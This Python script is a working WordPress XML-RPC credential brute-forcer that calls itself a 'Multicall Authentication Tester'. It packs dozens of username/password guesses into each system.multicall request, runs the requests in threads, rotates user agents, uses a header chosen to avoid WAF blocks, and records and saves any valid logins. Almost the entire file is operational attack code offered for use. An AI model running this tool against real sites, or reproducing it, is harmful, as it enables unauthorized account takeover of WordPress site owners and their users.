#!/usr/bin/env python3
"""
WordPress XML-RPC Pro: Multicall Authentication Tester
Author: baba01hacker
Version: 4.0 (Final Integration)
"""

import requests
import argparse
import sys
import time
import random
import urllib3
from typing import List, Tuple, Optional
from xml.etree import ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Disable SSL warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration ---
DEFAULT_BATCH_SIZE = 50   # Passwords per request (Safe limit for most servers)
DEFAULT_THREADS = 10      # Concurrent HTTP requests

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "WordPress/6.2; http://example.com",
    "curl/7.81.0" # Sometimes simple is better
]

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class WPMulticallTester:
    def __init__(self, target_url: str, verify_ssl: bool = False, 
                 proxy: Optional[str] = None, verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.endpoint = f"{self.target_url}/xmlrpc.php"
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.session = requests.Session()
        self.found_credentials = []
        
        # Base headers
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'text/xml', # Crucial: Some WAFs block application/xml
            'Accept': '*/*'
        })

    def _log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "INFO":
            print(f"[{Colors.BLUE}*{Colors.RESET}] {msg}")
        elif level == "SUCCESS":
            print(f"[{Colors.GREEN}+{Colors.RESET}] {Colors.BOLD}{msg}{Colors.RESET}")
        elif level == "ERROR":
            print(f"[{Colors.RED}-{Colors.RESET}] {msg}")
        elif level == "DEBUG" and self.verbose:
            print(f"[{Colors.YELLOW}DEBUG{Colors.RESET}] {msg}")

    def check_connection(self) -> bool:
        """Verifies XML-RPC exists and accepts POST"""
        payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
        try:
            self._log(f"Checking endpoint: {self.endpoint}", "DEBUG")
            response = self.session.post(
                self.endpoint, 
                data=payload, 
                verify=self.verify_ssl, 
                proxies=self.proxy, 
                timeout=10
            )
            
            if response.status_code == 200:
                self._log("XML-RPC endpoint is reachable.", "INFO")
                return True
            elif response.status_code == 405:
                self._log("Method Not Allowed (405). Server likely blocks POST or XML-RPC.", "ERROR")
            elif response.status_code == 403:
                self._log("Forbidden (403). WAF or security plugin active.", "ERROR")
            else:
                self._log(f"Unexpected status: {response.status_code}", "ERROR")
            return False
        except Exception as e:
            self._log(f"Connection failed: {e}", "ERROR")
            return False

    def _build_multicall_payload(self, batch_pairs: List[Tuple[str, str]]) -> str:
        """
        Constructs the nested XML payload for system.multicall.
        Structure matches the proven 'curl' output.
        """
        calls_xml = ""
        for user, password in batch_pairs:
            # This inner struct represents one 'wp.getUsersBlogs' call
            calls_xml += f"""
            <value><struct>
                <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name><value><array><data>
                    <value><string>{user}</string></value>
                    <value><string>{password}</string></value>
                </data></array></value></member>
            </struct></value>"""

        # Wrap all calls in the system.multicall array
        return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    {calls_xml}
  </data></array></value></param></params>
</methodCall>"""

    def _process_batch_response(self, response_text: str, batch_pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """
        Parses the multicall response to identify successful logins.
        Maps the response array index back to the batch_pairs index.
        """
        valid = []
        try:
            # Sanitize response slightly to avoid namespace issues if present
            clean_xml = response_text.replace('xmlns="http://www.w3.org/1999/xhtml"', '')
            root = ET.fromstring(clean_xml)
            
            # Navigate to the results array
            # Path: methodResponse -> params -> param -> value -> array -> data -> value (list)
            # We look for the <value> elements inside the main data array
            results = root.findall(".//params/param/value/array/data/value")
            
            # If the path above fails (some WP versions differ), try a looser search
            if not results:
                results = root.findall(".//data/value")

            for i, result_element in enumerate(results):
                if i >= len(batch_pairs): break # Safety break
                
                result_str = ET.tostring(result_element, encoding='unicode')
                
                # Logic based on your curl output:
                # FAILURE: Contains <name>faultCode</name>
                # SUCCESS: Contains <name>isAdmin</name> or <name>blogName</name>
                
                if '<name>faultCode</name>' not in result_str:
                    if '<name>isAdmin</name>' in result_str or '<name>blogName</name>' in result_str:
                        user, pwd = batch_pairs[i]
                        self._log(f"VALID CREDENTIALS: {user} : {pwd}", "SUCCESS")
                        valid.append((user, pwd))
        
        except ET.ParseError:
            self._log("XML Parse Error - Server might have returned garbage or blocked the large request.", "DEBUG")
        except Exception as e:
            self._log(f"Batch processing error: {e}", "DEBUG")
            
        return valid

    def attack_batch(self, batch_pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """Worker function for threads"""
        payload = self._build_multicall_payload(batch_pairs)
        try:
            response = self.session.post(
                self.endpoint,
                data=payload,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=20
            )
            
            if response.status_code == 200:
                return self._process_batch_response(response.text, batch_pairs)
            else:
                self._log(f"Batch HTTP Error: {response.status_code}", "DEBUG")
                return []
        except Exception as e:
            self._log(f"Request Error: {e}", "DEBUG")
            return []

    def run_multicall_attack(self, users: List[str], passwords: List[str], 
                            batch_size: int = DEFAULT_BATCH_SIZE, 
                            max_threads: int = DEFAULT_THREADS):
        """
        Main orchestration engine.
        Generates combinations -> Batches them -> Threads them.
        """
        # 1. Generate all combinations
        self._log(f"Generating combinations for {len(users)} users * {len(passwords)} passwords...", "INFO")
        combinations = [(u, p) for u in users for p in passwords]
        total_combos = len(combinations)
        
        if total_combos == 0:
            self._log("No combinations to test.", "ERROR")
            return

        # 2. Split into batches
        batches = [combinations[i:i + batch_size] for i in range(0, total_combos, batch_size)]
        self._log(f"Attack Config: {total_combos} attempts | {len(batches)} batches | {max_threads} threads", "INFO")

        # 3. Execute with ThreadPool
        start_time = time.time()
        completed_batches = 0
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_batch = {executor.submit(self.attack_batch, batch): batch for batch in batches}
            
            try:
                for future in as_completed(future_to_batch):
                    completed_batches += 1
                    
                    # Log progress every 10 batches or if verbose
                    if completed_batches % 5 == 0 or self.verbose:
                        elapsed = time.time() - start_time
                        rate = (completed_batches * batch_size) / elapsed if elapsed > 0 else 0
                        print(f"[{Colors.CYAN}PROGRESS{Colors.RESET}] {completed_batches}/{len(batches)} batches ({rate:.0f} pwd/sec) ...")

                    try:
                        valid_creds = future.result()
                        if valid_creds:
                            self.found_credentials.extend(valid_creds)
                    except Exception as exc:
                        self._log(f"Thread exception: {exc}", "DEBUG")
                        
            except KeyboardInterrupt:
                self._log("Attack interrupted by user. Waiting for threads to clean up...", "YELLOW")
                executor.shutdown(wait=False)
                raise

        duration = time.time() - start_time
        self._log(f"Scan completed in {duration:.2f} seconds.", "INFO")

# --- Helpers ---

def load_list(filepath: str) -> List[str]:
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}[!] File not found: {filepath}{Colors.RESET}")
        sys.exit(1)

def save_results(creds: List[Tuple[str, str]], filename: str):
    with open(filename, 'w') as f:
        f.write(f"# WP XML-RPC Scan Results - {datetime.now()}\n")
        for u, p in creds:
            f.write(f"{u}:{p}\n")
    print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.RESET}")

# --- Entry Point ---

def main():
    parser = argparse.ArgumentParser(
        description='WordPress XML-RPC Multicall Brute Force (Pro Version)',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. https://site.com)')
    parser.add_argument('-U', '--username', help='Single username')
    parser.add_argument('--user-file', help='File containing usernames')
    parser.add_argument('-P', '--password', help='Single password')
    parser.add_argument('--pass-file', help='File containing passwords')
    parser.add_argument('-b', '--batch-size', type=int, default=DEFAULT_BATCH_SIZE, help='Attempts per XML request (Default: 50)')
    parser.add_argument('-t', '--threads', type=int, default=DEFAULT_THREADS, help='Number of concurrent threads (Default: 10)')
    parser.add_argument('-o', '--output', help='File to save valid credentials')
    parser.add_argument('--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable debug logging')
    parser.add_argument('--no-verify', action='store_true', help='Skip SSL certificate verification')

    args = parser.parse_args()

    print(f"""{Colors.CYAN}
   __      __ ___  
   \ \    / /| _ \ 
    \ \/\/ / |  _/ 
     \_/\_/  |_|   XML-RPC PRO v4.0
    {Colors.RESET}""")

    # Input Validation
    users = []
    if args.username: users.append(args.username)
    if args.user_file: users.extend(load_list(args.user_file))

    passwords = []
    if args.password: passwords.append(args.password)
    if args.pass_file: passwords.extend(load_list(args.pass_file))

    if not users or not passwords:
        print(f"{Colors.RED}[!] Error: You must provide at least one user and one password.{Colors.RESET}")
        sys.exit(1)

    # Init Tester
    tester = WPMulticallTester(
        target_url=args.url,
        verify_ssl=not args.no_verify,
        proxy=args.proxy,
        verbose=args.verbose
    )

    # Run Checks and Attack
    if tester.check_connection():
        try:
            tester.run_multicall_attack(users, passwords, args.batch_size, args.threads)
        except KeyboardInterrupt:
            pass # Handled in run_attack
        
        if tester.found_credentials:
            print(f"\n{Colors.GREEN}{Colors.BOLD}=== SUCCESS: CREDENTIALS FOUND ==={Colors.RESET}")
            for u, p in tester.found_credentials:
                print(f"User: {u:<15} | Password: {p}")
            
            if args.output:
                save_results(tester.found_credentials, args.output)
        else:
            print(f"\n{Colors.YELLOW}[*] No valid credentials found.{Colors.RESET}")
    else:
        print(f"{Colors.RED}[!] Target does not appear to have XML-RPC enabled or accessible.{Colors.RESET}")

if __name__ == "__main__":
    main()
